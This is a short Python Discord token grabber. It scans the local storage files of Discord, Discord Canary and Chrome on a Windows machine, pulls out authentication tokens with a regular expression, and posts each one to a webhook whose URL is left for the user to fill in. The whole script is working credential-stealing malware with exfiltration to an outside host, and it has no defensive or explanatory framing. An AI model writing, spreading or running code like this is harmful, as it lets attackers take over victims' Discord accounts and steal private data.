import os, re, requests

webhook = "YOUR WEBHOOK URL"

dirs = [os.environ.get("APPDATA") + "\\Discord\\Local Storage\\leveldb", os.environ.get("APPDATA") + "\\discordcanary\\Local Storage\\leveldb", os.environ.get("USERPROFILE") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb"]

for location in dirs:
    for file in os.listdir(location):
        with open(f"{location}\\{file}", encoding='utf-8', errors='ignore') as _data:
            try:
                regex = re.findall(r"[MN][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}", _data.read())
                if regex:
                    for reg in regex:
                        requests.post(webhook, json={'content': reg});

            except PermissionError:
                continue
